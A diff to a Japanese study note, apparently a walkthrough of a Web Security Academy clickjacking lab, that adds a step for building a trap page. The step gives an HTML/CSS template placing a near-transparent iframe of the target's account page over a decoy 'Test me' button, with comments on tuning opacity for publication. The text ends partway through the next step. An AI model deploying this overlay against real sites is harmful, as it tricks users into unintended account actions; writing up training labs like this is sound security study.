@@ -13,4 +13,26 @@
 ## 手順 ※一度削除すると20分で何もできなくなるので改めて記載する。
 1. 被害者操作:ログインをする。
 ![[Pasted image 20251002234913.png]]
-2. 
+2. 罠サイトの構築
+```html
+<style>
+    iframe { /** ←これが実際のページ **/
+        position:relative;
+        width:$width_value; /** 横幅を設定 **/
+        height: $height_value; /** 立幅を設定 **/
+        opacity: $opacity; /** 明度の設定。ページ作成時は0.1で実際に公開するときは0.0001にする。 **/
+        z-index: 2;
+    }
+    div { /** ←自作するボタン(最背面に設置を行う) **/
+        position:absolute;
+        top:$top_value; /** ←高さ調整 **/
+        left:$side_value;/** ←横幅調整 **/
+        z-index: 1;
+    }
+</style>
+<div>Test me</div>
+<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"> /** ターゲットのサイト **/
+</iframe>
+```
+
+3. 調整時の実際のがめんは
